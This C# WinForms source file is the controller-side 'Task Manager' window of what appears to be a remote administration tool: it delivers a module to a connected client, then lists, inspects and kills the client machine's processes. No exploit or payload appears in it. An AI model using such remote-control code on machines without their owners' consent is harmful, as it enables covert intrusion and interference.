using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class TaskManagerForm : Form
{
    private const string ModuleFile = "mullvad.Module.TaskManager";
    private const string ModuleId   = "mullvad.taskmanager";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ──────────────────────────────────────────────────────────────
    private ToolStrip             toolbar        = null!;
    private ToolStripButton       btnRefresh     = null!;
    private ToolStripButton       btnKill        = null!;
    private ToolStripButton       btnDetails     = null!;
    private ToolStripButton       btnJumpToSelf  = null!;
    private ToolStripTextBox      txtSearch      = null!;
    private SplitContainer        split          = null!;
    private ListView              lvProcesses    = null!;
    private TabControl            tabs           = null!;
    private ListView              lvDetails      = null!;
    private ListView              lvThreads      = null!;
    private ListView              lvModules      = null!;
    private StatusStrip           statusStrip    = null!;
    private ToolStripStatusLabel  statusLabel    = null!;
    private ToolStripProgressBar  statusProgress = null!;
    private Panel                 loadingPanel   = null!;
    private Label                 loadingLabel   = null!;

    private ImageList? _processIcons;

    // ── Tree data ─────────────────────────────────────────────────────────────
    private sealed class ProcessNode
    {
        public string Name      = "";
        public string Path      = "";
        public string Desc      = "";
        public int    Pid;
        public int    ParentPid;
        public int    Threads;
        public int    Handles;
        public int    Session;
        public long   Memory;
        public long   CpuMs;
        public readonly List<ProcessNode> Children = new();
    }

    private List<ProcessNode>            _rootNodes    = new();
    private Dictionary<int, ProcessNode> _allNodes     = new();
    private HashSet<int>                 _expandedPids = new();
    private int                          _selfPid;

    private static readonly Dictionary<ClientHandler, TaskManagerForm> _openForms = new();

    public static TaskManagerForm CreateOrActivate(ClientHandler handler)
    {
        if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
        {
            existing.BringToFront();
            return existing;
        }
        var frm = new TaskManagerForm(handler);
        frm.FormClosed += (_, _) => _openForms.Remove(handler);
        _openForms[handler] = frm;
        return frm;
    }

    private TaskManagerForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text          = $"Task Manager  —  {_handler.Info.Computer}";
        ClientSize    = new Size(940, 600);
        Font          = new Font("Segoe UI", 9F);
        MinimumSize   = new Size(600, 400);
        StartPosition = FormStartPosition.CenterParent;
        ShowInTaskbar = true;

        var iconBmp = IconLoader.Load("application_cascade.png") as Bitmap;
        if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }
        else Icon = SystemIcons.Application;

        // ── Toolbar ───────────────────────────────────────────────────────────
        toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

        btnRefresh = MakeBtn("⟳", "Refresh process list", "refresh.png");
        btnRefresh.Click += (_, _) => _ = RefreshListAsync();

        btnKill = MakeBtn("✕", "End process", "delete.png");
        btnKill.Click   += (_, _) => _ = KillSelectedAsync();
        btnKill.Enabled  = false;

        btnDetails = MakeBtn("ℹ", "View details", "information.png");
        btnDetails.Click   += (_, _) => _ = LoadDetailsAsync();
        btnDetails.Enabled  = false;

        txtSearch = new ToolStripTextBox { Width = 180, ToolTipText = "Filter processes…" };
        ((TextBox)txtSearch.Control).PlaceholderText = "Search…";
        txtSearch.TextChanged += (_, _) => RebuildView(SelectedPid());

        txtSearch.KeyDown += (_, e) =>
        {
            if (e.KeyCode is Keys.Down or Keys.Enter)
            {
                lvProcesses.Focus();
                if (lvProcesses.Items.Count > 0 && lvProcesses.SelectedItems.Count == 0)
                    lvProcesses.Items[0].Selected = true;
                e.Handled = true;
            }
            else if (e.KeyCode == Keys.Escape)
            {
                txtSearch.Text = "";
                e.Handled = true;
            }
        };

        btnJumpToSelf = MakeBtn("◎", "Jump to client process", "application_go.png");
        btnJumpToSelf.Click     += (_, _) => JumpToSelf();
        btnJumpToSelf.Alignment  = ToolStripItemAlignment.Right;
        btnJumpToSelf.ToolTipText = "Select the client process (highlighted green)";

        toolbar.Items.AddRange(new ToolStripItem[]
        {
            btnRefresh,
            new ToolStripSeparator(),
            btnKill,
            btnDetails,
            new ToolStripSeparator(),
            new ToolStripLabel("Search:"),
            txtSearch,
            btnJumpToSelf,
        });

        // ── Process ListView ──────────────────────────────────────────────────
        lvProcesses = new ListView
        {
            View             = View.Details,
            FullRowSelect    = true,
            GridLines        = false,
            MultiSelect      = false,
            HideSelection    = false,
            UseCompatibleStateImageBehavior = false,
            Dock             = DockStyle.Fill,
        };
        lvProcesses.Columns.Add("Name",        210);
        lvProcesses.Columns.Add("PID",          55, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("CPU Time",      80, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("Memory",        90, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("Threads",       55, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("Handles",       55, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("Session",       50, HorizontalAlignment.Right);
        lvProcesses.Columns.Add("Description",  200);

        lvProcesses.ColumnClick          += LvProcesses_ColumnClick;
        lvProcesses.SelectedIndexChanged += LvProcesses_SelectionChanged;
        lvProcesses.DoubleClick          += (_, _) => _ = LoadDetailsAsync();
        lvProcesses.MouseClick           += LvProcesses_MouseClick;

        // ── Process context menu ──────────────────────────────────────────────
        var ctxProc  = new ContextMenuStrip();
        var miKill   = new ToolStripMenuItem("End Process");
        var miDetails = new ToolStripMenuItem("View Details");
        var miRefresh = new ToolStripMenuItem("Refresh");
        IconLoader.SetIcon(miKill,    "delete.png");
        IconLoader.SetIcon(miDetails, "information.png");
        IconLoader.SetIcon(miRefresh, "refresh.png");
        miKill.Click    += (_, _) => _ = KillSelectedAsync();
        miDetails.Click += (_, _) => _ = LoadDetailsAsync();
        miRefresh.Click += (_, _) => _ = RefreshListAsync();
        ctxProc.Items.AddRange(new ToolStripItem[] { miKill, miDetails, new ToolStripSeparator(), miRefresh });
        ctxProc.Opening += (_, _) =>
        {
            bool has = lvProcesses.SelectedItems.Count > 0;
            miKill.Enabled    = has;
            miDetails.Enabled = has;
        };
        lvProcesses.ContextMenuStrip = ctxProc;

        // ── Detail tabs ───────────────────────────────────────────────────────
        tabs = new TabControl { Dock = DockStyle.Fill };

        lvDetails = new ListView
        {
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            HeaderStyle   = ColumnHeaderStyle.Nonclickable,
            Dock          = DockStyle.Fill,
        };
        lvDetails.Columns.Add("Property", 200);
        lvDetails.Columns.Add("Value",    400);
        var tabDetails = new TabPage("Details") { Padding = new Padding(0) };
        tabDetails.Controls.Add(lvDetails);
        tabs.TabPages.Add(tabDetails);

        lvThreads = new ListView
        {
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            Dock          = DockStyle.Fill,
        };
        lvThreads.Columns.Add("Thread ID",    80,  HorizontalAlignment.Right);
        lvThreads.Columns.Add("State",       100);
        lvThreads.Columns.Add("Wait Reason", 120);
        lvThreads.Columns.Add("Priority",     65,  HorizontalAlignment.Right);
        lvThreads.Columns.Add("Base Pri",     65,  HorizontalAlignment.Right);
        lvThreads.Columns.Add("CPU (ms)",     90,  HorizontalAlignment.Right);
        lvThreads.Columns.Add("Start Time",  160);
        var tabThreads = new TabPage("Threads") { Padding = new Padding(0) };
        tabThreads.Controls.Add(lvThreads);
        tabs.TabPages.Add(tabThreads);

        lvModules = new ListView
        {
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            Dock          = DockStyle.Fill,
        };
        lvModules.Columns.Add("Module",       160);
        lvModules.Columns.Add("Base Address",  100, HorizontalAlignment.Right);
        lvModules.Columns.Add("Size",           80, HorizontalAlignment.Right);
        lvModules.Columns.Add("Path",          360);
        var tabModules = new TabPage("Modules") { Padding = new Padding(0) };
        tabModules.Controls.Add(lvModules);
        tabs.TabPages.Add(tabModules);

        // ── Split ─────────────────────────────────────────────────────────────
        split = new SplitContainer
        {
            Dock             = DockStyle.Fill,
            Orientation      = Orientation.Horizontal,
            SplitterDistance = 320,
        };
        split.Panel1.Controls.Add(lvProcesses);
        split.Panel2.Controls.Add(tabs);

        // ── Status ────────────────────────────────────────────────────────────
        statusStrip    = new StatusStrip();
        statusLabel    = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusProgress = new ToolStripProgressBar { Visible = false, Width = 120 };
        statusStrip.Items.AddRange(new ToolStripItem[] { statusLabel, statusProgress });

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel
        {
            Dock      = DockStyle.Fill,
            BackColor = Color.FromArgb(200, SystemColors.Control),
            Visible   = true,
        };
        loadingLabel = new Label
        {
            Text      = "Delivering module to client…",
            AutoSize  = false,
            TextAlign = ContentAlignment.MiddleCenter,
            Dock      = DockStyle.Fill,
            Font      = new Font("Segoe UI", 10F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(split);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);
        loadingPanel.BringToFront();

        ResumeLayout(false);
        PerformLayout();

        Load       += OnLoad;
        FormClosed += OnFormClosed;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load — deliver module then populate
    // ─────────────────────────────────────────────────────────────────────────
    private async void OnLoad(object? sender, EventArgs e)
    {
        SetToolbarEnabled(false);
        _handler.Disconnected += OnClientDisconnected;

        var progress = new Progress<string>(msg =>
        {
            loadingLabel.Text = msg;
            statusLabel.Text  = msg;
        });

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            loadingLabel.Text = "Module file not found.\nBuild the TaskManager project first.";
            statusLabel.Text  = "Module not found.";
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, progress, cts.Token);

        if (!ok)
        {
            loadingLabel.Text = "Failed to load module on client.";
            statusLabel.Text  = "Module delivery failed.";
            return;
        }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

        loadingPanel.Visible = false;
        SetToolbarEnabled(true);

        await RefreshListAsync();
    }

    private void OnFormClosed(object? sender, FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnClientDisconnected;
        _ctx?.Dispose();
        _processIcons?.Dispose();
    }

    private void OnClientDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            SetToolbarEnabled(false);
            statusLabel.Text  = "Disconnected.";
            loadingLabel.Text = "Client disconnected.";
            loadingPanel.Visible = true;
        });
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Refresh process list
    // ─────────────────────────────────────────────────────────────────────────
    private async Task RefreshListAsync()
    {
        if (_ctx == null) return;
        SetBusy(true);
        statusLabel.Text = "Refreshing process list…";
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            var json = await _ctx.ExecuteAsync("list", "", cts.Token);
            ParseProcessList(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }
    }

    private void ParseProcessList(string json)
    {
        int prevSel = SelectedPid();

        var newIcons  = new ImageList { ImageSize = new Size(16, 16), ColorDepth = ColorDepth.Depth32Bit };
        var rawNodes  = new List<ProcessNode>();
        int newSelfPid = 0;

        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // ── self PID ──────────────────────────────────────────────────────
            if (root.TryGetProperty("self_pid", out var spEl) && spEl.ValueKind == JsonValueKind.Number)
                spEl.TryGetInt32(out newSelfPid);

            // ── Decode icons dict ─────────────────────────────────────────────
            if (root.TryGetProperty("icons", out var iconsEl) && iconsEl.ValueKind == JsonValueKind.Object)
            {
                foreach (var kv in iconsEl.EnumerateObject())
                {
                    string b64 = kv.Value.GetString() ?? "";
                    if (string.IsNullOrEmpty(b64)) continue;
                    try
                    {
                        var imgBytes = Convert.FromBase64String(b64);
                        using var ms  = new MemoryStream(imgBytes);
                        using var tmp = Image.FromStream(ms);
                        newIcons.Images.Add(kv.Name, new Bitmap(tmp));
                    }
                    catch { }
                }
            }

            // ── Parse process list ────────────────────────────────────────────
            var procEl = root.ValueKind == JsonValueKind.Array ? root
                       : root.TryGetProperty("processes", out var pa) ? pa
                       : default;

            if (procEl.ValueKind == JsonValueKind.Array)
            {
                foreach (var el in procEl.EnumerateArray())
                {
                    rawNodes.Add(new ProcessNode
                    {
                        Name      = Str(el, "name"),
                        Pid       = Int(el, "pid"),
                        ParentPid = Int(el, "parent_pid"),
                        CpuMs     = Long(el, "cpu_ms"),
                        Memory    = Long(el, "memory"),
                        Threads   = Int(el, "threads"),
                        Handles   = Int(el, "handles"),
                        Session   = Int(el, "session"),
                        Desc      = Str(el, "description"),
                        Path      = Str(el, "path"),
                    });
                }
            }
        }
        catch (Exception ex)
        {
            statusLabel.Text = $"Parse error: {ex.Message}";
            newIcons.Dispose();
            return;
        }

        // ── Add default fallback icon ─────────────────────────────────────────
        try
        {
            newIcons.Images.Add("__default__",
                new Bitmap(SystemIcons.Application.ToBitmap(), new Size(16, 16)));
        }
        catch { }

        // ── Build process tree ────────────────────────────────────────────────
        var newAllNodes  = new Dictionary<int, ProcessNode>(rawNodes.Count);
        var newRootNodes = new List<ProcessNode>();

        foreach (var n in rawNodes)
            newAllNodes[n.Pid] = n;

        foreach (var n in rawNodes)
        {
            if (n.ParentPid != 0 && newAllNodes.TryGetValue(n.ParentPid, out var parent))
                parent.Children.Add(n);
            else
                newRootNodes.Add(n);
        }

        static int CmpByName(ProcessNode a, ProcessNode b)
            => string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);

        newRootNodes.Sort(CmpByName);
        foreach (var n in newAllNodes.Values) n.Children.Sort(CmpByName);

        // ── Swap ImageList BEFORE touching ListView ───────────────────────────
        lvProcesses.SmallImageList = null;
        var oldIcons   = _processIcons;
        _processIcons  = newIcons;
        lvProcesses.SmallImageList = _processIcons;
        oldIcons?.Dispose();

        _allNodes  = newAllNodes;
        _rootNodes = newRootNodes;
        _selfPid   = newSelfPid;

        RebuildView(prevSel);
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Rebuild visible process list from tree + search + expand state
    // ─────────────────────────────────────────────────────────────────────────
    private void RebuildView(int restorePid = 0)
    {
        string search = txtSearch.Text.Trim();

        // Build flat (visible) list
        var visible = new List<(ProcessNode node, int depth)>();

        if (!string.IsNullOrEmpty(search))
        {
            // Flat filtered list — no tree structure
            foreach (var n in _allNodes.Values)
            {
                if (n.Name.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                    n.Desc.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                    n.Pid.ToString().Contains(search))
                {
                    visible.Add((n, 0));
                }
            }
            visible.Sort((a, b) =>
                string.Compare(a.node.Name, b.node.Name, StringComparison.OrdinalIgnoreCase));
        }
        else
        {
            // Tree view
            void Walk(ProcessNode node, int depth)
            {
                visible.Add((node, depth));
                if (node.Children.Count > 0 && _expandedPids.Contains(node.Pid))
                {
                    foreach (var child in node.Children)
                        Walk(child, depth + 1);
                }
            }
            foreach (var root in _rootNodes)
                Walk(root, 0);
        }

        lvProcesses.BeginUpdate();
        lvProcesses.Items.Clear();

        foreach (var (node, depth) in visible)
        {
            bool isInSearch  = !string.IsNullOrEmpty(search);
            bool hasChildren = node.Children.Count > 0 && !isInSearch;

            // Text-based indentation: 3 spaces per depth level
            string indent = depth > 0 ? new string(' ', depth * 3) : "";
            string toggle = hasChildren
                ? (_expandedPids.Contains(node.Pid) ? "[-] " : "[+] ")
                : (depth > 0 ? "    " : "");          // align with [X] width

            var lvi = new ListViewItem(indent + toggle + node.Name + ".exe")
            {
                Tag = node.Pid,
            };

            // Icon: use process path if available, else default
            string imgKey = (!string.IsNullOrEmpty(node.Path) &&
                             _processIcons != null &&
                             _processIcons.Images.ContainsKey(node.Path))
                ? node.Path
                : "__default__";
            lvi.ImageKey = imgKey;

            // Highlight client process in green
            if (_selfPid != 0 && node.Pid == _selfPid)
                lvi.ForeColor = Color.LimeGreen;

            lvi.SubItems.Add(node.Pid.ToString());
            lvi.SubItems.Add(FormatCpuMs(node.CpuMs));
            lvi.SubItems.Add(FormatBytes(node.Memory));
            lvi.SubItems.Add(node.Threads.ToString());
            lvi.SubItems.Add(node.Handles.ToString());
            lvi.SubItems.Add(node.Session.ToString());
            lvi.SubItems.Add(node.Desc);

            lvProcesses.Items.Add(lvi);
        }

        lvProcesses.EndUpdate();

        // Restore selection
        if (restorePid > 0)
        {
            foreach (ListViewItem item in lvProcesses.Items)
            {
                if (item.Tag is int p && p == restorePid)
                {
                    item.Selected = true;
                    item.EnsureVisible();
                    break;
                }
            }
        }

        statusLabel.Text = $"{_allNodes.Count} processes  —  {DateTime.Now:HH:mm:ss}";
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Expand / collapse on click
    // ─────────────────────────────────────────────────────────────────────────
    private void LvProcesses_MouseClick(object? sender, MouseEventArgs e)
    {
        if (!string.IsNullOrEmpty(txtSearch.Text)) return; // tree mode only

        var info = lvProcesses.HitTest(e.X, e.Y);
        if (info.Item?.Tag is not int pid) return;
        if (!_allNodes.TryGetValue(pid, out var node)) return;
        if (node.Children.Count == 0) return;

        // Only toggle when clicking the first column (Name)
        if (info.SubItem != info.Item.SubItems[0]) return;

        int topIdx = lvProcesses.TopItem?.Index ?? 0;

        if (_expandedPids.Contains(pid))
            _expandedPids.Remove(pid);
        else
            _expandedPids.Add(pid);

        int sel = SelectedPid();
        RebuildView(sel);

        // Attempt to keep approximate scroll position
        if (topIdx < lvProcesses.Items.Count)
            try { lvProcesses.TopItem = lvProcesses.Items[topIdx]; } catch { }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Jump to client process
    // ─────────────────────────────────────────────────────────────────────────
    private void JumpToSelf()
    {
        if (_selfPid == 0) return;

        // If in tree mode, ensure all ancestors are expanded so the node is visible
        if (string.IsNullOrEmpty(txtSearch.Text))
        {
            if (_allNodes.TryGetValue(_selfPid, out var selfNode))
            {
                int parentPid = selfNode.ParentPid;
                while (parentPid != 0 && _allNodes.ContainsKey(parentPid))
                {
                    _expandedPids.Add(parentPid);
                    parentPid = _allNodes[parentPid].ParentPid;
                }
            }
            RebuildView(_selfPid);
        }

        // Find and select the item
        foreach (ListViewItem item in lvProcesses.Items)
        {
            if (item.Tag is int p && p == _selfPid)
            {
                lvProcesses.SelectedItems.Clear();
                item.Selected = true;
                item.EnsureVisible();
                lvProcesses.Focus();
                return;
            }
        }

        statusLabel.Text = "Client process not found in list.";
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Kill process
    // ─────────────────────────────────────────────────────────────────────────
    private async Task KillSelectedAsync()
    {
        if (_ctx == null || lvProcesses.SelectedItems.Count == 0) return;

        int pid  = SelectedPid();
        var name = lvProcesses.SelectedItems[0].Text;

        if (MessageBox.Show(
                $"End process \"{name}\" (PID {pid})?\n\nUnsaved data will be lost.",
                "End Process",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning) != DialogResult.Yes)
            return;

        SetBusy(true);
        statusLabel.Text = $"Killing PID {pid}…";
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(15));
            var json = await _ctx.ExecuteAsync("kill", $"{{\"pid\":{pid}}}", cts.Token);

            using var doc = JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("error", out var err))
                statusLabel.Text = $"Error: {err.GetString()}";
            else
                statusLabel.Text = $"Killed PID {pid}.";
        }
        catch (Exception ex) { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }

        await RefreshListAsync();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load details for selected process
    // ─────────────────────────────────────────────────────────────────────────
    private async Task LoadDetailsAsync()
    {
        if (_ctx == null || lvProcesses.SelectedItems.Count == 0) return;

        int pid = SelectedPid();
        SetBusy(true);
        statusLabel.Text = $"Loading details for PID {pid}…";
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            var json = await _ctx.ExecuteAsync("details", $"{{\"pid\":{pid}}}", cts.Token);
            ParseDetails(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }
    }

    private void ParseDetails(string json)
    {
        lvDetails.BeginUpdate();
        lvDetails.Items.Clear();
        lvThreads.BeginUpdate();
        lvThreads.Items.Clear();
        lvModules.BeginUpdate();
        lvModules.Items.Clear();

        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("error", out var err))
            {
                statusLabel.Text = $"Error: {err.GetString()}";
                return;
            }

            void AddDetail(string prop, string val)
            {
                var lvi = new ListViewItem(prop);
                lvi.SubItems.Add(val);
                lvDetails.Items.Add(lvi);
            }

            AddDetail("PID",             Str(root, "pid_str") is { Length: > 0 } s ? s : Int(root, "pid").ToString());
            AddDetail("Name",            Str(root, "name"));
            AddDetail("Description",     Str(root, "description"));
            AddDetail("Company",         Str(root, "company"));
            AddDetail("Version",         Str(root, "version"));
            AddDetail("Path",            Str(root, "path"));
            AddDetail("Window Title",    Str(root, "title"));
            AddDetail("Priority",        Str(root, "priority"));
            AddDetail("Session",         Int(root, "session").ToString());
            AddDetail("Responding",      root.TryGetProperty("responding", out var resp) ? (resp.GetBoolean() ? "Yes" : "No") : "");
            AddDetail("Start Time",      Str(root, "start_time"));
            AddDetail("CPU Time (ms)",   Long(root, "cpu_ms").ToString("N0"));
            AddDetail("CPU User (ms)",   Long(root, "cpu_user_ms").ToString("N0"));
            AddDetail("CPU Kernel (ms)", Long(root, "cpu_kernel_ms").ToString("N0"));
            AddDetail("Working Set",     FormatBytes(Long(root, "memory_working_set")));
            AddDetail("Private Memory",  FormatBytes(Long(root, "memory_private")));
            AddDetail("Virtual Memory",  FormatBytes(Long(root, "memory_virtual")));
            AddDetail("Paged Memory",    FormatBytes(Long(root, "memory_paged")));
            AddDetail("Handles",         Int(root, "handles").ToString());

            if (root.TryGetProperty("thread_list", out var threadArr) && threadArr.ValueKind == JsonValueKind.Array)
            {
                foreach (var t in threadArr.EnumerateArray())
                {
                    long startFileTime = Long(t, "start_time");
                    string startStr = "";
                    try
                    {
                        if (startFileTime > 0)
                            startStr = DateTime.FromFileTimeUtc(startFileTime).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
                    }
                    catch { }

                    var lvi = new ListViewItem(Int(t, "id").ToString());
                    lvi.SubItems.Add(Str(t, "state"));
                    lvi.SubItems.Add(Str(t, "wait_reason"));
                    lvi.SubItems.Add(Int(t, "priority").ToString());
                    lvi.SubItems.Add(Int(t, "base_priority").ToString());
                    lvi.SubItems.Add(Long(t, "cpu_ms").ToString("N0"));
                    lvi.SubItems.Add(startStr);
                    lvThreads.Items.Add(lvi);
                }
            }

            if (root.TryGetProperty("module_list", out var modArr) && modArr.ValueKind == JsonValueKind.Array)
            {
                foreach (var m in modArr.EnumerateArray())
                {
                    var lvi = new ListViewItem(Str(m, "name"));
                    lvi.SubItems.Add(Str(m, "base"));
                    lvi.SubItems.Add(FormatBytes(Long(m, "size")));
                    lvi.SubItems.Add(Str(m, "path"));
                    lvModules.Items.Add(lvi);
                }
            }

            string procName = Str(root, "name");
            int    procPid  = Int(root, "pid");
            statusLabel.Text = $"Details for {procName}.exe (PID {procPid})  —  {lvThreads.Items.Count} threads, {lvModules.Items.Count} modules";
        }
        catch (Exception ex) { statusLabel.Text = $"Parse error: {ex.Message}"; }
        finally
        {
            lvDetails.EndUpdate();
            lvThreads.EndUpdate();
            lvModules.EndUpdate();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Column sort (flat/search mode only)
    // ─────────────────────────────────────────────────────────────────────────
    private int  _sortCol = 0;
    private bool _sortAsc = true;

    private void LvProcesses_ColumnClick(object? sender, ColumnClickEventArgs e)
    {
        if (string.IsNullOrEmpty(txtSearch.Text)) return; // no sort in tree mode

        if (_sortCol == e.Column) _sortAsc = !_sortAsc;
        else { _sortCol = e.Column; _sortAsc = true; }
        lvProcesses.ListViewItemSorter = new ProcessSorter(_sortCol, _sortAsc);
        lvProcesses.Sort();
    }

    private void LvProcesses_SelectionChanged(object? sender, EventArgs e)
    {
        bool has = lvProcesses.SelectedItems.Count > 0;
        btnKill.Enabled    = has;
        btnDetails.Enabled = has;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private int SelectedPid()
    {
        if (lvProcesses.SelectedItems.Count == 0) return 0;
        return lvProcesses.SelectedItems[0].Tag is int p ? p : 0;
    }

    private void SetToolbarEnabled(bool on)
    {
        foreach (ToolStripItem i in toolbar.Items) i.Enabled = on;
        if (on)
        {
            bool has = lvProcesses.SelectedItems.Count > 0;
            btnKill.Enabled    = has;
            btnDetails.Enabled = has;
        }
    }

    private void SetBusy(bool busy)
    {
        statusProgress.Visible = busy;
        if (busy) statusProgress.Style = ProgressBarStyle.Marquee;
    }

    private static ToolStripButton MakeBtn(string text, string tip, string? iconFile = null)
    {
        var btn = new ToolStripButton
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Image,
            ImageScaling = ToolStripItemImageScaling.SizeToFit,
        };
        if (iconFile != null)
        {
            var img = IconLoader.Load(iconFile);
            if (img is not null) { btn.Image = img; return btn; }
        }
        btn.Text         = text;
        btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }

    private static string FormatBytes(long bytes)
    {
        if (bytes <= 0)          return "0 B";
        if (bytes < 1024)        return $"{bytes} B";
        if (bytes < 1048576)     return $"{bytes / 1024.0:F1} KB";
        if (bytes < 1073741824L) return $"{bytes / 1048576.0:F1} MB";
        return $"{bytes / 1073741824.0:F2} GB";
    }

    private static string FormatCpuMs(long ms)
    {
        if (ms <= 0)      return "0ms";
        if (ms < 1000)    return $"{ms}ms";
        if (ms < 60000)   return $"{ms / 1000.0:F1}s";
        if (ms < 3600000) return $"{ms / 60000.0:F1}m";
        return $"{ms / 3600000.0:F1}h";
    }

    private static string Str(JsonElement el, string key)
        => el.TryGetProperty(key, out var v) ? v.GetString() ?? "" : "";

    private static int Int(JsonElement el, string key)
    {
        if (!el.TryGetProperty(key, out var v)) return 0;
        if (v.ValueKind == JsonValueKind.Number && v.TryGetInt32(out int i)) return i;
        if (v.ValueKind == JsonValueKind.String && int.TryParse(v.GetString(), out int s)) return s;
        return 0;
    }

    private static long Long(JsonElement el, string key)
    {
        if (!el.TryGetProperty(key, out var v)) return 0;
        if (v.ValueKind == JsonValueKind.Number && v.TryGetInt64(out long l)) return l;
        if (v.ValueKind == JsonValueKind.String && long.TryParse(v.GetString(), out long s)) return s;
        return 0;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Column sorter (used in search/flat mode)
    // ─────────────────────────────────────────────────────────────────────────
    private sealed class ProcessSorter : System.Collections.IComparer
    {
        private readonly int  _col;
        private readonly bool _asc;

        public ProcessSorter(int col, bool asc) { _col = col; _asc = asc; }

        public int Compare(object? x, object? y)
        {
            var a = (x as ListViewItem)?.SubItems[_col].Text ?? "";
            var b = (y as ListViewItem)?.SubItems[_col].Text ?? "";

            int cmp;
            if (_col is 1 or 4 or 5 or 6)
                cmp = int.TryParse(a, out int ai) && int.TryParse(b, out int bi)
                      ? ai.CompareTo(bi) : string.Compare(a, b, StringComparison.OrdinalIgnoreCase);
            else if (_col is 3)
                cmp = ParseMemory(a).CompareTo(ParseMemory(b));
            else
                cmp = string.Compare(a, b, StringComparison.OrdinalIgnoreCase);

            return _asc ? cmp : -cmp;
        }

        private static long ParseMemory(string s)
        {
            if (string.IsNullOrEmpty(s)) return 0;
            var parts = s.Split(' ');
            if (parts.Length < 2 || !double.TryParse(parts[0], out double v)) return 0;
            return parts[1] switch
            {
                "KB" => (long)(v * 1024),
                "MB" => (long)(v * 1048576),
                "GB" => (long)(v * 1073741824),
                _    => (long)v,
            };
        }
    }
}
